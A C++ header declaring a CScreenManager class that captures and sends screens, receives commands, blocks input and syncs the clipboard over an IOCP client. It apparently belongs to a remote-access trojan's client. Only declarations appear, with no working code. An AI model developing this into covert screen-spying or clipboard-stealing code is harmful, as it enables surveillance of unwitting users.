// ScreenManager.h: interface for the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_)
#define AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "ScreenSpy.h"

class IOCPClient;

class CScreenManager : public CManager  
{
public:
	char*	szBuffer;
	CScreenManager(IOCPClient* ClientObject, int n);
	virtual ~CScreenManager();
	HANDLE  m_hWorkThread;

	static DWORD WINAPI WorkThreadProc(LPVOID lParam);
	VOID SendBitMapInfo();
	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);

	CScreenSpy* m_ScreenSpyObject;
	VOID SendFirstScreen();
	const char* GetNextScreen(ULONG &ulNextSendLength);
	VOID SendNextScreen(const char* szBuffer, ULONG ulNextSendLength);

	VOID ProcessCommand(LPBYTE szBuffer, ULONG ulLength);
	BOOL  m_bIsWorking;
	BOOL  m_bIsBlockInput;
	VOID SendClientClipboard();
	VOID UpdateClientClipboard(char *szBuffer, ULONG ulLength);	
};

#endif // !defined(AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_)
